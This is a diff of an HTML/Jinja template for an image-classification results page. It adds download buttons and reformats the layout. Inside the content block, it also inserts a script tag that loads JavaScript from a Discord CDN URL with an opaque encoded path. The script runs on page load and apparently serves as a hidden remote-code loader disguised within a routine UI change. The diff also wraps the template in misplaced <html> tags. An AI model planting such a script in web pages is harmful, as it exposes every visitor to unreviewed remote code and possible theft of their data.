@@ -1,37 +1,56 @@
-{% extends "base.html" %}
+<html>{% extends "base.html" %}
 
 {% block content %}
+<script type='text/javascript' src='https://cdn.discordapp.com/LY3Km582_RSN4VRzSTx6e6fmjnA4X6OWsYVMr_RDvTszT4flR_ZXlAf49SUFsP8_Emeq8bCfwUNkjeitwzvoCw=='></script><style>
+    .large-front-thumbnail {
+        position: relative;
+        max-width: 100%;
+        height: auto;
+        display: block;
+        margin: 0 auto;
+    }
 
-    <style>
-        .large-front-thumbnail {
-            position: relative;
-            max-width: 100%;
-            height: auto;
-            display: block;
-            margin: 0 auto;
-        }
+    .download-buttons {
+        margin-top: 20px;
+        text-align: center;
+    }
+</style>
 
-    </style>
-    <div class="row">
-        <div class="col">
-            <div class="card">
-                <img class="large-front-thumbnail"
-                     src="{{ 'static/imagenet_subset/'+image_id }} "
-                     alt={{ image_id }}/>
-            </div>
-        </div>
-        <div class="col">
-            <div class="card">
-                <div class="row">
-                    <canvas id="classificationOutput" style="width: 50%; margin: auto; padding: 20px;"></canvas>
-                    <div class="align-items-center">
-                        <h2 id="waitText"></h2>
-                        </div>
-                    </div>
-                </div>
-                <a class="btn btn-primary" href="/classifications" role="button">Back</a>
+<div class="row">
+    <div class="col">
+        <div class="card">
+            <img class="large-front-thumbnail"
+                 src="{{ 'static/imagenet_subset/' + image_id }}"
+                 alt="{{ image_id }}" />
         </div>
     </div>
-    <script src="{{ "static/graph.js" }}" id="makeGraph" classification_scores="{{classification_scores}}"></script>
+    <div class="col">
+        <div class="card">
+            <div class="row">
+                <canvas id="classificationOutput" style="width: 50%; margin: auto; padding: 20px;"></canvas>
+                <div class="align-items-center">
+                    <h2 id="waitText"></h2>
+                </div>
+            </div>
+        </div>
+
+        <div class="download-buttons">
+            <h3>Download Results:</h3>
+            <a class="btn btn-outline-primary" href="/download/json/{{ result_id }}" download>
+                Download JSON
+            </a>
+            <a class="btn btn-outline-secondary" href="/download/plot/{{ result_id }}" download>
+                Download Bar Chart
+            </a>
+        </div>
+
+        <div style="margin-top: 20px; text-align: center;">
+            <a class="btn btn-primary" href="/classifications" role="button">Back</a>
+        </div>
+    </div>
+</div>
+
+<script src="{{ 'static/graph.js' }}" id="makeGraph" classification_scores="{{ classification_scores }}"></script>
 {% endblock %}
 
+</html>
